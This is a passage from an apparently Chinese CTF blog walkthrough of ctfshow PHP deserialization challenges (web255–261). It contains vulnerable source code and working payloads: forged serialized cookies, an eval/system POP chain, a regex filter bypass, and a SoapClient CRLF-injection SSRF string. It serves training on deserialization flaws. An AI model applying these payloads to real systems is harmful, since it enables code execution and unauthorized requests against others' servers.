&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>查看源码<br>依然需要通过GET传入参数username和password。值也是需要和ctfShowUser类里的一样。<br>区别在于，多了个COOKIE传参，我们需要通过COOKIE传入参数user.<br>由于后面需要参数isVip&#x3D;true，所以写脚本序列化后拿给user即可。</p>
</li>
<li><p>写脚本传参</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到序列化后的字符串，赋给user<br>COOKIE: <code>user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>GET: <code>?username=xxxxxx&amp;password=xxxxxx</code><br>成功拿到flag</p>
</li>
</ol>
<h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题相较于上一题的区别在于多了验证变量username与password是否相等，不相等才能输出flag。</p>
</li>
<li><p>构造payload<br>脚本改造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>只需要将cookie的值改为这个脚本输出的值，并且get传入的参数与脚本username和password相等即可。<br>成功拿到flag</p>
</li>
</ol>
<h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><code>__construct()函数</code><br>对象创建时自动调用，对对象进行初始化。</li>
<li><code>__destruct()函数</code><br>当所有操作执行完毕后，有需要释放的对象会自动触发该方法。</li>
</ul>
<p>与之前相比变化的地方在于，public变量变为了private变量，并且ctfShowUser类里多了一个私有变量class，多了两个魔术方法与两个类<br>我们可以看到类backDoor里有我们需要的eval函数，通过这个函数执行我们想执行的代码。</p>
<ol start="2">
<li>构造payload<br>于是我们可以写如下脚本来或许序列化后的字符串：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
这个脚本将原本实例化类info的class变量改为了backDoor，并且在类backDoor里将变量code赋值为能够显示flag的代码。<br>系统命令可以用tac，tac是cat命令的反转，它使行逆序显示文件内容。也可以使用cat命令，但是需要在源码中找寻flag<br>GET参数与上一题不变：<br><code>?username=1&amp;password=2</code><br>成功拿到flag</li>
</ol>
<h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与上一题的区别只是在于增加了过滤，不允许字母o或c后面出现数字，我们可以使用加号（+）绕过。如 O:+8</p>
</li>
<li><p>构造payload<br>脚本和上一题相似，但我们不使用urlencode了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的序列化字符如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;system(&quot;</span>tac flag.php<span class="string">&quot;);&quot;</span>;&#125;&#125; <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>将 O:数字 格式的所有数字前加上加号（+），并进行url编码，之后送给Cookie中的user<br>GET传参与上一题相同<br>成功拿到flag</p>
</li>
</ol>
<h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><ol>
<li>查看源码<br>页面源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure>
flag.php源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这道题所涵盖的知识很多，这里先贴两篇文章：<br><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF</a><br><a href="https://www.secpulse.com/archives/165358.html">SoapClient</a></li>
</ol>
<ul>
<li>CRLF<br>CRLF是回车和换行的简称 <code>\r\n</code><br>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</li>
<li>SoapClient原生类<br>SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。<br>soap的拓展的安装，直接打开php.ini，找到extension&#x3D;soap，然后把前面的注释去掉，再重启服务即可。</li>
<li>explode()函数<br>使用一个字符串分割另一个字符串<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explode(string $separator, string $string, int $limit = PHP_INT_MAX): array</span><br><span class="line">此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 separator 作为边界点分割出来。</span><br></pre></td></tr></table></figure>
<a href="https://www.php.net/manual/zh/function.explode">官方文档</a></li>
<li>array_pop()函数<br>弹出数组最后一个单元（出栈）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_pop(array &amp;$array): mixed</span><br><span class="line">array_pop() 弹出并返回 array 最后一个元素的值，并将 array 的长度减一。</span><br><span class="line">注意: 使用此函数后会重置（reset()）array 指针。</span><br></pre></td></tr></table></figure>
<a href="https://www.php.net/manual/zh/function.array-pop">官方文档</a></li>
</ul>
<p>要得到flag，必须本地访问flag.php而且带上token。因为本题有cloudfare代理，无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p>
<ol start="2">
<li>构造payload<br>首先脚本如下：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;Lxxx\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
location就是我们要访问的url，其中uri也是不可缺少的，但是其实没什么用。关键就是因为我们可以控制user_agent，所以可以CRLF注入。<br>因为Content-length的缘故，post只取到token&#x3D;ctfshow，其它不需要的部分被丢弃，实现了自己构造POST的请求包。<br>最后将得到的经过url编码后序列化字符串通过GET方式给变量vip，即构造payload为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>
最后访问flag.txt，即可拿到flag。</li>
</ol>
<h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过GET方式传入变量ctfshow，需要包含preg_match里的字符串</p>
</li>
<li><p>构造payload<br>直接构造为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
</li>
</ol>
<h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 